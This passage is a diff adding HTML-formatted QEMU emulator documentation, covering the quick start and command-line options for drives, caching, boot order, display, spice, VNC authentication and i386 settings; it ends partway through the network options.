+<p><a name="pcsys_quickstart"></a>
+<a name="pcsys_005fquickstart"></a>
+
+<h3 class="section">3.2 Quick Start</h3>
+
+<p><a name="index-quick-start-10"></a>
+Download and uncompress the linux image (<samp><span class="file">linux.img</span></samp>) and type:
+
+<pre class="example">qemu linux.img
+</pre>
+<p>Linux should boot and give you a prompt.
+
+<p><a name="sec_invocation"></a>
+<a name="sec_005finvocation"></a>
+
+<h3 class="section">3.3 Invocation</h3>
+
+<pre class="example"><!-- man begin SYNOPSIS -->
+usage: qemu [options] [<var>disk_image</var>]
+<!-- man end -->
+</pre>
+<!-- man begin OPTIONS -->
+<p><var>disk_image</var> is a raw hard disk image for IDE hard disk 0. Some
+targets do not need a disk image.
+
+<p>Standard options:
+     <dl>
+<dt><samp><span class="option">-h</span></samp><dd><a name="index-g_t_002dh-11"></a>Display help and exit
+<br><dt><samp><span class="option">-version</span></samp><dd><a name="index-g_t_002dversion-12"></a>Display version information and exit
+<br><dt><samp><span class="option">-M </span><var>machine</var></samp><dd><a name="index-g_t_002dM-13"></a>Select the emulated <var>machine</var> (<code>-M ?</code> for list)
+<br><dt><samp><span class="option">-cpu </span><var>model</var></samp><dd><a name="index-g_t_002dcpu-14"></a>Select CPU model (-cpu ? for list and additional feature selection)
+<br><dt><samp><span class="option">-smp </span><var>n</var><span class="option">[,cores=</span><var>cores</var><span class="option">][,threads=</span><var>threads</var><span class="option">][,sockets=</span><var>sockets</var><span class="option">][,maxcpus=</span><var>maxcpus</var><span class="option">]</span></samp><dd><a name="index-g_t_002dsmp-15"></a>Simulate an SMP system with <var>n</var> CPUs. On the PC target, up to 255
+CPUs are supported. On Sparc32 target, Linux limits the number of usable CPUs
+to 4. 
+For the PC target, the number of <var>cores</var> per socket, the number
+of <var>threads</var> per cores and the total number of <var>sockets</var> can be
+specified. Missing values will be computed. If any on the three values is
+given, the total number of CPUs <var>n</var> can be omitted. <var>maxcpus</var>
+specifies the maximum number of hotpluggable CPUs. 
+<br><dt><samp><span class="option">-numa </span><var>opts</var></samp><dd><a name="index-g_t_002dnuma-16"></a>Simulate a multi node NUMA system. If mem and cpus are omitted, resources
+are split equally. 
+<br><dt><samp><span class="option">-fda </span><var>file</var></samp><br><dt><samp><span class="option">-fdb </span><var>file</var></samp><dd><a name="index-g_t_002dfda-17"></a><a name="index-g_t_002dfdb-18"></a>Use <var>file</var> as floppy disk 0/1 image (see <a href="#disk_005fimages">disk_images</a>). You can
+use the host floppy by using <samp><span class="file">/dev/fd0</span></samp> as filename (see <a href="#host_005fdrives">host_drives</a>). 
+<br><dt><samp><span class="option">-hda </span><var>file</var></samp><br><dt><samp><span class="option">-hdb </span><var>file</var></samp><br><dt><samp><span class="option">-hdc </span><var>file</var></samp><br><dt><samp><span class="option">-hdd </span><var>file</var></samp><dd><a name="index-g_t_002dhda-19"></a><a name="index-g_t_002dhdb-20"></a><a name="index-g_t_002dhdc-21"></a><a name="index-g_t_002dhdd-22"></a>Use <var>file</var> as hard disk 0, 1, 2 or 3 image (see <a href="#disk_005fimages">disk_images</a>). 
+<br><dt><samp><span class="option">-cdrom </span><var>file</var></samp><dd><a name="index-g_t_002dcdrom-23"></a>Use <var>file</var> as CD-ROM image (you cannot use <samp><span class="option">-hdc</span></samp> and
+<samp><span class="option">-cdrom</span></samp> at the same time). You can use the host CD-ROM by
+using <samp><span class="file">/dev/cdrom</span></samp> as filename (see <a href="#host_005fdrives">host_drives</a>). 
+<br><dt><samp><span class="option">-drive </span><var>option</var><span class="option">[,</span><var>option</var><span class="option">[,</span><var>option</var><span class="option">[,...]]]</span></samp><dd><a name="index-g_t_002ddrive-24"></a>
+Define a new drive. Valid options are:
+
+          <dl>
+<dt><samp><span class="option">file=</span><var>file</var></samp><dd>This option defines which disk image (see <a href="#disk_005fimages">disk_images</a>) to use with
+this drive. If the filename contains comma, you must double it
+(for instance, "file=my,,file" to use file "my,file"). 
+<br><dt><samp><span class="option">if=</span><var>interface</var></samp><dd>This option defines on which type on interface the drive is connected. 
+Available types are: ide, scsi, sd, mtd, floppy, pflash, virtio. 
+<br><dt><samp><span class="option">bus=</span><var>bus</var><span class="option">,unit=</span><var>unit</var></samp><dd>These options define where is connected the drive by defining the bus number and
+the unit id. 
+<br><dt><samp><span class="option">index=</span><var>index</var></samp><dd>This option defines where is connected the drive by using an index in the list
+of available connectors of a given interface type. 
+<br><dt><samp><span class="option">media=</span><var>media</var></samp><dd>This option defines the type of the media: disk or cdrom. 
+<br><dt><samp><span class="option">cyls=</span><var>c</var><span class="option">,heads=</span><var>h</var><span class="option">,secs=</span><var>s</var><span class="option">[,trans=</span><var>t</var><span class="option">]</span></samp><dd>These options have the same definition as they have in <samp><span class="option">-hdachs</span></samp>. 
+<br><dt><samp><span class="option">snapshot=</span><var>snapshot</var></samp><dd><var>snapshot</var> is "on" or "off" and allows to enable snapshot for given drive (see <samp><span class="option">-snapshot</span></samp>). 
+<br><dt><samp><span class="option">cache=</span><var>cache</var></samp><dd><var>cache</var> is "none", "writeback", "unsafe", or "writethrough" and controls how the host cache is used to access block data. 
+<br><dt><samp><span class="option">aio=</span><var>aio</var></samp><dd><var>aio</var> is "threads", or "native" and selects between pthread based disk I/O and native Linux AIO. 
+<br><dt><samp><span class="option">format=</span><var>format</var></samp><dd>Specify which disk <var>format</var> will be used rather than detecting
+the format.  Can be used to specifiy format=raw to avoid interpreting
+an untrusted format header. 
+<br><dt><samp><span class="option">serial=</span><var>serial</var></samp><dd>This option specifies the serial number to assign to the device. 
+<br><dt><samp><span class="option">addr=</span><var>addr</var></samp><dd>Specify the controller's PCI address (if=virtio only). 
+<br><dt><samp><span class="option">boot=</span><var>boot</var></samp><dd><var>boot</var> is "on" or "off" and allows for booting from non-traditional interfaces, such as virtio. 
+</dl>
+
+     <p>By default, writethrough caching is used for all block device.  This means that
+the host page cache will be used to read and write data but write notification
+will be sent to the guest only when the data has been reported as written by
+the storage subsystem.
+
+     <p>Writeback caching will report data writes as completed as soon as the data is
+present in the host page cache.  This is safe as long as you trust your host. 
+If your host crashes or loses power, then the guest may experience data
+corruption.
+
+     <p>The host page cache can be avoided entirely with <samp><span class="option">cache=none</span></samp>.  This will
+attempt to do disk IO directly to the guests memory.  QEMU may still perform
+an internal copy of the data.
+
+     <p>Some block drivers perform badly with <samp><span class="option">cache=writethrough</span></samp>, most notably,
+qcow2.  If performance is more important than correctness,
+<samp><span class="option">cache=writeback</span></samp> should be used with qcow2.
+
+     <p>In case you don't care about data integrity over host failures, use
+cache=unsafe. This option tells qemu that it never needs to write any data
+to the disk but can instead keeps things in cache. If anything goes wrong,
+like your host losing power, the disk storage getting disconnected accidently,
+etc. you're image will most probably be rendered unusable.   When using
+the <samp><span class="option">-snapshot</span></samp> option, unsafe caching is always used.
+
+     <p>Instead of <samp><span class="option">-cdrom</span></samp> you can use:
+     <pre class="example">     qemu -drive file=file,index=2,media=cdrom
+</pre>
+     <p>Instead of <samp><span class="option">-hda</span></samp>, <samp><span class="option">-hdb</span></samp>, <samp><span class="option">-hdc</span></samp>, <samp><span class="option">-hdd</span></samp>, you can
+use:
+     <pre class="example">     qemu -drive file=file,index=0,media=disk
+     qemu -drive file=file,index=1,media=disk
+     qemu -drive file=file,index=2,media=disk
+     qemu -drive file=file,index=3,media=disk
+</pre>
+     <p>You can connect a CDROM to the slave of ide0:
+     <pre class="example">     qemu -drive file=file,if=ide,index=1,media=cdrom
+</pre>
+     <p>If you don't specify the "file=" argument, you define an empty drive:
+     <pre class="example">     qemu -drive if=ide,index=1,media=cdrom
+</pre>
+     <p>You can connect a SCSI disk with unit ID 6 on the bus #0:
+     <pre class="example">     qemu -drive file=file,if=scsi,bus=0,unit=6
+</pre>
+     <p>Instead of <samp><span class="option">-fda</span></samp>, <samp><span class="option">-fdb</span></samp>, you can use:
+     <pre class="example">     qemu -drive file=file,index=0,if=floppy
+     qemu -drive file=file,index=1,if=floppy
+</pre>
+     <p>By default, <var>interface</var> is "ide" and <var>index</var> is automatically
+incremented:
+     <pre class="example">     qemu -drive file=a -drive file=b"
+</pre>
+     <p>is interpreted like:
+     <pre class="example">     qemu -hda a -hdb b
+</pre>
+     <br><dt><samp><span class="option">-set</span></samp><dd><a name="index-g_t_002dset-25"></a>TODO
+<br><dt><samp><span class="option">-global</span></samp><dd><a name="index-g_t_002dglobal-26"></a>TODO
+<br><dt><samp><span class="option">-mtdblock </span><var>file</var></samp><dd><a name="index-g_t_002dmtdblock-27"></a>Use <var>file</var> as on-board Flash memory image. 
+<br><dt><samp><span class="option">-sd </span><var>file</var></samp><dd><a name="index-g_t_002dsd-28"></a>Use <var>file</var> as SecureDigital card image. 
+<br><dt><samp><span class="option">-pflash </span><var>file</var></samp><dd><a name="index-g_t_002dpflash-29"></a>Use <var>file</var> as a parallel flash image. 
+<br><dt><samp><span class="option">-boot [order=</span><var>drives</var><span class="option">][,once=</span><var>drives</var><span class="option">][,menu=on|off]</span></samp><dd><a name="index-g_t_002dboot-30"></a>Specify boot order <var>drives</var> as a string of drive letters. Valid
+drive letters depend on the target achitecture. The x86 PC uses: a, b
+(floppy 1 and 2), c (first hard disk), d (first CD-ROM), n-p (Etherboot
+from network adapter 1-4), hard disk boot is the default. To apply a
+particular boot order only on the first startup, specify it via
+<samp><span class="option">once</span></samp>.
+
+     <p>Interactive boot menus/prompts can be enabled via <samp><span class="option">menu=on</span></samp> as far
+as firmware/BIOS supports them. The default is non-interactive boot.
+
+     <pre class="example">     # try to boot from network first, then from hard disk
+     qemu -boot order=nc
+     # boot from CD-ROM first, switch back to default order after reboot
+     qemu -boot once=d
+</pre>
+     <p>Note: The legacy format '-boot <var>drives</var>' is still supported but its
+use is discouraged as it may be removed from future versions. 
+<br><dt><samp><span class="option">-snapshot</span></samp><dd><a name="index-g_t_002dsnapshot-31"></a>Write to temporary files instead of disk image files. In this case,
+the raw disk image you use is not written back. You can however force
+the write back by pressing &lt;C-a s&gt; (see <a href="#disk_005fimages">disk_images</a>). 
+<br><dt><samp><span class="option">-m </span><var>megs</var></samp><dd><a name="index-g_t_002dm-32"></a>Set virtual RAM size to <var>megs</var> megabytes. Default is 128 MiB.  Optionally,
+a suffix of &ldquo;M&rdquo; or &ldquo;G&rdquo; can be used to signify a value in megabytes or
+gigabytes respectively. 
+<br><dt><samp><span class="option">-mem-path </span><var>path</var></samp><dd>Allocate guest RAM from a temporarily created file in <var>path</var>. 
+<br><dt><samp><span class="option">-mem-prealloc</span></samp><dd>Preallocate memory when using -mem-path. 
+<br><dt><samp><span class="option">-k </span><var>language</var></samp><dd><a name="index-g_t_002dk-33"></a>Use keyboard layout <var>language</var> (for example <code>fr</code> for
+French). This option is only needed where it is not easy to get raw PC
+keycodes (e.g. on Macs, with some X11 servers or with a VNC
+display). You don't normally need to use it on PC/Linux or PC/Windows
+hosts.
+
+     <p>The available layouts are:
+     <pre class="example">     ar  de-ch  es  fo     fr-ca  hu  ja  mk     no  pt-br  sv
+     da  en-gb  et  fr     fr-ch  is  lt  nl     pl  ru     th
+     de  en-us  fi  fr-be  hr     it  lv  nl-be  pt  sl     tr
+</pre>
+     <p>The default is <code>en-us</code>. 
+<br><dt><samp><span class="option">-audio-help</span></samp><dd><a name="index-g_t_002daudio_002dhelp-34"></a>Will show the audio subsystem help: list of drivers, tunable
+parameters. 
+<br><dt><samp><span class="option">-soundhw </span><var>card1</var><span class="option">[,</span><var>card2</var><span class="option">,...] or -soundhw all</span></samp><dd><a name="index-g_t_002dsoundhw-35"></a>Enable audio and selected sound hardware. Use ? to print all
+available sound hardware.
+
+     <pre class="example">     qemu -soundhw sb16,adlib disk.img
+     qemu -soundhw es1370 disk.img
+     qemu -soundhw ac97 disk.img
+     qemu -soundhw hda disk.img
+     qemu -soundhw all disk.img
+     qemu -soundhw ?
+</pre>
+     <p>Note that Linux's i810_audio OSS kernel (for AC97) module might
+require manually specifying clocking.
+
+     <pre class="example">     modprobe i810_audio clocking=48000
+</pre>
+     </dl>
+USB options:
+     <dl>
+<dt><samp><span class="option">-usb</span></samp><dd><a name="index-g_t_002dusb-36"></a>Enable the USB driver (will be the default soon)
+
+     <br><dt><samp><span class="option">-usbdevice </span><var>devname</var></samp><dd><a name="index-g_t_002dusbdevice-37"></a>Add the USB device <var>devname</var>. See <a href="#usb_005fdevices">usb_devices</a>.
+
+          <dl>
+<dt><samp><span class="option">mouse</span></samp><dd>Virtual Mouse. This will override the PS/2 mouse emulation when activated.
+
+          <br><dt><samp><span class="option">tablet</span></samp><dd>Pointer device that uses absolute coordinates (like a touchscreen). This
+means qemu is able to report the mouse position without having to grab the
+mouse. Also overrides the PS/2 mouse emulation when activated.
+
+          <br><dt><samp><span class="option">disk:[format=</span><var>format</var><span class="option">]:</span><var>file</var></samp><dd>Mass storage device based on file. The optional <var>format</var> argument
+will be used rather than detecting the format. Can be used to specifiy
+<code>format=raw</code> to avoid interpreting an untrusted format header.
+
+          <br><dt><samp><span class="option">host:</span><var>bus</var><span class="option">.</span><var>addr</var></samp><dd>Pass through the host device identified by <var>bus</var>.<var>addr</var> (Linux only).
+
+          <br><dt><samp><span class="option">host:</span><var>vendor_id</var><span class="option">:</span><var>product_id</var></samp><dd>Pass through the host device identified by <var>vendor_id</var>:<var>product_id</var>
+(Linux only).
+
+          <br><dt><samp><span class="option">serial:[vendorid=</span><var>vendor_id</var><span class="option">][,productid=</span><var>product_id</var><span class="option">]:</span><var>dev</var></samp><dd>Serial converter to host character device <var>dev</var>, see <code>-serial</code> for the
+available devices.
+
+          <br><dt><samp><span class="option">braille</span></samp><dd>Braille device.  This will use BrlAPI to display the braille output on a real
+or fake device.
+
+          <br><dt><samp><span class="option">net:</span><var>options</var></samp><dd>Network adapter that supports CDC ethernet and RNDIS protocols.
+
+     </dl>
+     <br><dt><samp><span class="option">-device </span><var>driver</var><span class="option">[,</span><var>prop</var><span class="option">[=</span><var>value</var><span class="option">][,...]]</span></samp><dd><a name="index-g_t_002ddevice-38"></a>Add device <var>driver</var>.  <var>prop</var>=<var>value</var> sets driver
+properties.  Valid properties depend on the driver.  To get help on
+possible drivers and properties, use <code>-device ?</code> and
+<code>-device </code><var>driver</var><code>,?</code>. 
+File system options:
+
+     <p>The general form of a File system device option is:
+          <dl>
+<dt><samp><span class="option">-fsdev </span><var>fstype</var><span class="option"> ,id=</span><var>id</var><span class="option"> [,</span><var>options</var><span class="option">]</span></samp><dd><a name="index-g_t_002dfsdev-39"></a>Fstype is one of:
+<samp><span class="option">local</span></samp>,
+The specific Fstype will determine the applicable options.
+
+          <p>Options to each backend are described below.
+
+          <br><dt><samp><span class="option">-fsdev local ,id=</span><var>id</var><span class="option"> ,path=</span><var>path</var><span class="option"> ,security_model=</span><var>security_model</var></samp><dd>
+Create a file-system-"device" for local-filesystem.
+
+          <p><samp><span class="option">local</span></samp> is only available on Linux.
+
+          <p><samp><span class="option">path</span></samp> specifies the path to be exported. <samp><span class="option">path</span></samp> is required.
+
+          <p><samp><span class="option">security_model</span></samp> specifies the security model to be followed. 
+<samp><span class="option">security_model</span></samp> is required.
+
+     </dl>
+     Virtual File system pass-through options:
+
+     <p>The general form of a Virtual File system pass-through option is:
+          <dl>
+<dt><samp><span class="option">-virtfs </span><var>fstype</var><span class="option"> [,</span><var>options</var><span class="option">]</span></samp><dd><a name="index-g_t_002dvirtfs-40"></a>Fstype is one of:
+<samp><span class="option">local</span></samp>,
+The specific Fstype will determine the applicable options.
+
+          <p>Options to each backend are described below.
+
+          <br><dt><samp><span class="option">-virtfs local ,path=</span><var>path</var><span class="option"> ,mount_tag=</span><var>mount_tag</var><span class="option"> ,security_model=</span><var>security_model</var></samp><dd>
+Create a Virtual file-system-pass through for local-filesystem.
+
+          <p><samp><span class="option">local</span></samp> is only available on Linux.
+
+          <p><samp><span class="option">path</span></samp> specifies the path to be exported. <samp><span class="option">path</span></samp> is required.
+
+          <p><samp><span class="option">security_model</span></samp> specifies the security model to be followed. 
+<samp><span class="option">security_model</span></samp> is required.
+
+          <p><samp><span class="option">mount_tag</span></samp> specifies the tag with which the exported file is mounted. 
+<samp><span class="option">mount_tag</span></samp> is required.
+
+     </dl>
+
+     <br><dt><samp><span class="option">-name </span><var>name</var></samp><dd><a name="index-g_t_002dname-41"></a>Sets the <var>name</var> of the guest. 
+This name will be displayed in the SDL window caption. 
+The <var>name</var> will also be used for the VNC server. 
+Also optionally set the top visible process name in Linux. 
+<br><dt><samp><span class="option">-uuid </span><var>uuid</var></samp><dd><a name="index-g_t_002duuid-42"></a>Set system UUID. 
+</dl>
+
+<p>Display options:
+     <dl>
+<dt><samp><span class="option">-nographic</span></samp><dd><a name="index-g_t_002dnographic-43"></a>Normally, QEMU uses SDL to display the VGA output. With this option,
+you can totally disable graphical output so that QEMU is a simple
+command line application. The emulated serial port is redirected on
+the console. Therefore, you can still use QEMU to debug a Linux kernel
+with a serial console. 
+<br><dt><samp><span class="option">-curses</span></samp><dd><a name="index-curses-44"></a>Normally, QEMU uses SDL to display the VGA output.  With this option,
+QEMU can display the VGA output when in text mode using a
+curses/ncurses interface.  Nothing is displayed in graphical mode. 
+<br><dt><samp><span class="option">-no-frame</span></samp><dd><a name="index-g_t_002dno_002dframe-45"></a>Do not use decorations for SDL windows and start them using the whole
+available screen space. This makes the using QEMU in a dedicated desktop
+workspace more convenient. 
+<br><dt><samp><span class="option">-alt-grab</span></samp><dd><a name="index-g_t_002dalt_002dgrab-46"></a>Use Ctrl-Alt-Shift to grab mouse (instead of Ctrl-Alt). 
+<br><dt><samp><span class="option">-ctrl-grab</span></samp><dd><a name="index-g_t_002dctrl_002dgrab-47"></a>Use Right-Ctrl to grab mouse (instead of Ctrl-Alt). 
+<br><dt><samp><span class="option">-no-quit</span></samp><dd><a name="index-g_t_002dno_002dquit-48"></a>Disable SDL window close capability. 
+<br><dt><samp><span class="option">-sdl</span></samp><dd><a name="index-g_t_002dsdl-49"></a>Enable SDL. 
+<br><dt><samp><span class="option">-spice </span><var>option</var><span class="option">[,</span><var>option</var><span class="option">[,...]]</span></samp><dd><a name="index-g_t_002dspice-50"></a>Enable the spice remote desktop protocol. Valid options are
+
+          <dl>
+<dt><samp><span class="option">port=&lt;nr&gt;</span></samp><dd>Set the TCP port spice is listening on for plaintext channels.
+
+          <br><dt><samp><span class="option">addr=&lt;addr&gt;</span></samp><dd>Set the IP address spice is listening on.  Default is any address.
+
+          <br><dt><samp><span class="option">ipv4</span></samp><br><dt><samp><span class="option">ipv6</span></samp><dd>Force using the specified IP version.
+
+          <br><dt><samp><span class="option">password=&lt;secret&gt;</span></samp><dd>Set the password you need to authenticate.
+
+          <br><dt><samp><span class="option">disable-ticketing</span></samp><dd>Allow client connects without authentication.
+
+          <br><dt><samp><span class="option">tls-port=&lt;nr&gt;</span></samp><dd>Set the TCP port spice is listening on for encrypted channels.
+
+          <br><dt><samp><span class="option">x509-dir=&lt;dir&gt;</span></samp><dd>Set the x509 file directory. Expects same filenames as -vnc $display,x509=$dir
+
+          <br><dt><samp><span class="option">x509-key-file=&lt;file&gt;</span></samp><br><dt><samp><span class="option">x509-key-password=&lt;file&gt;</span></samp><br><dt><samp><span class="option">x509-cert-file=&lt;file&gt;</span></samp><br><dt><samp><span class="option">x509-cacert-file=&lt;file&gt;</span></samp><br><dt><samp><span class="option">x509-dh-key-file=&lt;file&gt;</span></samp><dd>The x509 file names can also be configured individually.
+
+          <br><dt><samp><span class="option">tls-ciphers=&lt;list&gt;</span></samp><dd>Specify which ciphers to use.
+
+          <br><dt><samp><span class="option">tls-channel=[main|display|inputs|record|playback|tunnel]</span></samp><br><dt><samp><span class="option">plaintext-channel=[main|display|inputs|record|playback|tunnel]</span></samp><dd>Force specific channel to be used with or without TLS encryption.  The
+options can be specified multiple times to configure multiple
+channels.  The special name "default" can be used to set the default
+mode.  For channels which are not explicitly forced into one mode the
+spice client is allowed to pick tls/plaintext as he pleases.
+
+          <br><dt><samp><span class="option">image-compression=[auto_glz|auto_lz|quic|glz|lz|off]</span></samp><dd>Configure image compression (lossless). 
+Default is auto_glz.
+
+          <br><dt><samp><span class="option">jpeg-wan-compression=[auto|never|always]</span></samp><br><dt><samp><span class="option">zlib-glz-wan-compression=[auto|never|always]</span></samp><dd>Configure wan image compression (lossy for slow links). 
+Default is auto.
+
+          <br><dt><samp><span class="option">streaming-video=[off|all|filter]</span></samp><dd>Configure video stream detection.  Default is filter.
+
+          <br><dt><samp><span class="option">agent-mouse=[on|off]</span></samp><dd>Enable/disable passing mouse events via vdagent.  Default is on.
+
+          <br><dt><samp><span class="option">playback-compression=[on|off]</span></samp><dd>Enable/disable audio stream compression (using celt 0.5.1).  Default is on.
+
+     </dl>
+     <br><dt><samp><span class="option">-portrait</span></samp><dd><a name="index-g_t_002dportrait-51"></a>Rotate graphical output 90 deg left (only PXA LCD). 
+<br><dt><samp><span class="option">-vga </span><var>type</var></samp><dd><a name="index-g_t_002dvga-52"></a>Select type of VGA card to emulate. Valid values for <var>type</var> are
+          <dl>
+<dt><samp><span class="option">cirrus</span></samp><dd>Cirrus Logic GD5446 Video card. All Windows versions starting from
+Windows 95 should recognize and use this graphic card. For optimal
+performances, use 16 bit color depth in the guest and the host OS. 
+(This one is the default)
+<br><dt><samp><span class="option">std</span></samp><dd>Standard VGA card with Bochs VBE extensions.  If your guest OS
+supports the VESA 2.0 VBE extensions (e.g. Windows XP) and if you want
+to use high resolution modes (&gt;= 1280x1024x16) then you should use
+this option. 
+<br><dt><samp><span class="option">vmware</span></samp><dd>VMWare SVGA-II compatible adapter. Use it if you have sufficiently
+recent XFree86/XOrg server or Windows guest with a driver for this
+card. 
+<br><dt><samp><span class="option">qxl</span></samp><dd>QXL paravirtual graphic card.  It is VGA compatible (including VESA
+2.0 VBE support).  Works best with qxl guest drivers installed though. 
+Recommended choice when using the spice protocol. 
+<br><dt><samp><span class="option">none</span></samp><dd>Disable VGA card. 
+</dl>
+     <br><dt><samp><span class="option">-full-screen</span></samp><dd><a name="index-g_t_002dfull_002dscreen-53"></a>Start in full screen. 
+<br><dt><samp><span class="option">-g </span><var>width</var><span class="option">x</span><var>height</var><span class="option">[x</span><var>depth</var><span class="option">]</span></samp><dd><a name="index-g_t_002dg-54"></a>Set the initial graphical resolution and depth (PPC, SPARC only). 
+<br><dt><samp><span class="option">-vnc </span><var>display</var><span class="option">[,</span><var>option</var><span class="option">[,</span><var>option</var><span class="option">[,...]]]</span></samp><dd><a name="index-g_t_002dvnc-55"></a>Normally, QEMU uses SDL to display the VGA output.  With this option,
+you can have QEMU listen on VNC display <var>display</var> and redirect the VGA
+display over the VNC session.  It is very useful to enable the usb
+tablet device when using this option (option <samp><span class="option">-usbdevice
+tablet</span></samp>). When using the VNC display, you must use the <samp><span class="option">-k</span></samp>
+parameter to set the keyboard layout if you are not using en-us. Valid
+syntax for the <var>display</var> is
+
+          <dl>
+<dt><samp><var>host</var><span class="option">:</span><var>d</var></samp><dd>
+TCP connections will only be allowed from <var>host</var> on display <var>d</var>. 
+By convention the TCP port is 5900+<var>d</var>. Optionally, <var>host</var> can
+be omitted in which case the server will accept connections from any host.
+
+          <br><dt><samp><span class="option">unix:</span><var>path</var></samp><dd>
+Connections will be allowed over UNIX domain sockets where <var>path</var> is the
+location of a unix socket to listen for connections on.
+
+          <br><dt><samp><span class="option">none</span></samp><dd>
+VNC is initialized but not started. The monitor <code>change</code> command
+can be used to later start the VNC server.
+
+     </dl>
+
+     <p>Following the <var>display</var> value there may be one or more <var>option</var> flags
+separated by commas. Valid options are
+
+          <dl>
+<dt><samp><span class="option">reverse</span></samp><dd>
+Connect to a listening VNC client via a &ldquo;reverse&rdquo; connection. The
+client is specified by the <var>display</var>. For reverse network
+connections (<var>host</var>:<var>d</var>,<code>reverse</code>), the <var>d</var> argument
+is a TCP port number, not a display number.
+
+          <br><dt><samp><span class="option">password</span></samp><dd>
+Require that password based authentication is used for client connections. 
+The password must be set separately using the <code>change</code> command in the
+<a href="#pcsys_005fmonitor">pcsys_monitor</a>
+
+          <br><dt><samp><span class="option">tls</span></samp><dd>
+Require that client use TLS when communicating with the VNC server. This
+uses anonymous TLS credentials so is susceptible to a man-in-the-middle
+attack. It is recommended that this option be combined with either the
+<samp><span class="option">x509</span></samp> or <samp><span class="option">x509verify</span></samp> options.
+
+          <br><dt><samp><span class="option">x509=</span><var>/path/to/certificate/dir</var></samp><dd>
+Valid if <samp><span class="option">tls</span></samp> is specified. Require that x509 credentials are used
+for negotiating the TLS session. The server will send its x509 certificate
+to the client. It is recommended that a password be set on the VNC server
+to provide authentication of the client when this is used. The path following
+this option specifies where the x509 certificates are to be loaded from. 
+See the <a href="#vnc_005fsecurity">vnc_security</a> section for details on generating certificates.
+
+          <br><dt><samp><span class="option">x509verify=</span><var>/path/to/certificate/dir</var></samp><dd>
+Valid if <samp><span class="option">tls</span></samp> is specified. Require that x509 credentials are used
+for negotiating the TLS session. The server will send its x509 certificate
+to the client, and request that the client send its own x509 certificate. 
+The server will validate the client's certificate against the CA certificate,
+and reject clients when validation fails. If the certificate authority is
+trusted, this is a sufficient authentication mechanism. You may still wish
+to set a password on the VNC server as a second authentication layer. The
+path following this option specifies where the x509 certificates are to
+be loaded from. See the <a href="#vnc_005fsecurity">vnc_security</a> section for details on generating
+certificates.
+
+          <br><dt><samp><span class="option">sasl</span></samp><dd>
+Require that the client use SASL to authenticate with the VNC server. 
+The exact choice of authentication method used is controlled from the
+system / user's SASL configuration file for the 'qemu' service. This
+is typically found in /etc/sasl2/qemu.conf. If running QEMU as an
+unprivileged user, an environment variable SASL_CONF_PATH can be used
+to make it search alternate locations for the service config. 
+While some SASL auth methods can also provide data encryption (eg GSSAPI),
+it is recommended that SASL always be combined with the 'tls' and
+'x509' settings to enable use of SSL and server certificates. This
+ensures a data encryption preventing compromise of authentication
+credentials. See the <a href="#vnc_005fsecurity">vnc_security</a> section for details on using
+SASL authentication.
+
+          <br><dt><samp><span class="option">acl</span></samp><dd>
+Turn on access control lists for checking of the x509 client certificate
+and SASL party. For x509 certs, the ACL check is made against the
+certificate's distinguished name. This is something that looks like
+<code>C=GB,O=ACME,L=Boston,CN=bob</code>. For SASL party, the ACL check is
+made against the username, which depending on the SASL plugin, may
+include a realm component, eg <code>bob</code> or <code>bob@EXAMPLE.COM</code>. 
+When the <samp><span class="option">acl</span></samp> flag is set, the initial access list will be
+empty, with a <code>deny</code> policy. Thus no one will be allowed to
+use the VNC server until the ACLs have been loaded. This can be
+achieved using the <code>acl</code> monitor command.
+
+          <br><dt><samp><span class="option">lossy</span></samp><dd>
+Enable lossy compression methods (gradient, JPEG, ...). If this
+option is set, VNC client may receive lossy framebuffer updates
+depending on its encoding settings. Enabling this option can save
+a lot of bandwidth at the expense of quality.
+
+     </dl>
+     </dl>
+
+<p>i386 target only:
+     <dl>
+<dt><samp><span class="option">-win2k-hack</span></samp><dd><a name="index-g_t_002dwin2k_002dhack-56"></a>Use it when installing Windows 2000 to avoid a disk full bug. After
+Windows 2000 is installed, you no longer need this option (this option
+slows down the IDE transfers). 
+<br><dt><samp><span class="option">-no-fd-bootchk</span></samp><dd><a name="index-g_t_002dno_002dfd_002dbootchk-57"></a>Disable boot signature checking for floppy disks in Bochs BIOS. It may
+be needed to boot from old floppy disks. 
+TODO: check reference to Bochs BIOS. 
+<br><dt><samp><span class="option">-no-acpi</span></samp><dd><a name="index-g_t_002dno_002dacpi-58"></a>Disable ACPI (Advanced Configuration and Power Interface) support. Use
+it if your guest OS complains about ACPI problems (PC target machine
+only). 
+<br><dt><samp><span class="option">-no-hpet</span></samp><dd><a name="index-g_t_002dno_002dhpet-59"></a>Disable HPET support. 
+<br><dt><samp><span class="option">-balloon none</span></samp><dd><a name="index-g_t_002dballoon-60"></a>Disable balloon device. 
+<br><dt><samp><span class="option">-balloon virtio[,addr=</span><var>addr</var><span class="option">]</span></samp><dd>Enable virtio balloon device (default), optionally with PCI address
+<var>addr</var>. 
+<br><dt><samp><span class="option">-acpitable [sig=</span><var>str</var><span class="option">][,rev=</span><var>n</var><span class="option">][,oem_id=</span><var>str</var><span class="option">][,oem_table_id=</span><var>str</var><span class="option">][,oem_rev=</span><var>n</var><span class="option">] [,asl_compiler_id=</span><var>str</var><span class="option">][,asl_compiler_rev=</span><var>n</var><span class="option">][,data=</span><var>file1</var><span class="option">[:</span><var>file2</var><span class="option">]...]</span></samp><dd><a name="index-g_t_002dacpitable-61"></a>Add ACPI table with specified header fields and context from specified files. 
+<br><dt><samp><span class="option">-smbios file=</span><var>binary</var></samp><dd><a name="index-g_t_002dsmbios-62"></a>Load SMBIOS entry from binary file.
+
+     <br><dt><samp><span class="option">-smbios type=0[,vendor=</span><var>str</var><span class="option">][,version=</span><var>str</var><span class="option">][,date=</span><var>str</var><span class="option">][,release=</span><var>%d.%d</var><span class="option">]</span></samp><dd><a name="index-g_t_002dsmbios-63"></a>Specify SMBIOS type 0 fields
+
+     <br><dt><samp><span class="option">-smbios type=1[,manufacturer=</span><var>str</var><span class="option">][,product=</span><var>str</var><span class="option">] [,version=</span><var>str</var><span class="option">][,serial=</span><var>str</var><span class="option">][,uuid=</span><var>uuid</var><span class="option">][,sku=</span><var>str</var><span class="option">] [,family=</span><var>str</var><span class="option">]</span></samp><dd>Specify SMBIOS type 1 fields
+
+</dl>
+Network options:
+     <dl>
+<dt><samp><span class="option">-net nic[,vlan=</span><var>n</var><span class="option">][,macaddr=</span><var>mac</var><span class="option">][,model=</span><var>type</var><span class="option">] [,name=</span><var>name</var><span class="option">][,addr=</span><var>addr</var><span class="option">][,vectors=</span><var>v</var><span class="option">]</span></samp><dd><a name="index-g_t_002dnet-64"></a>Create a new Network Interface Card and connect it to VLAN <var>n</var> (<var>n</var>
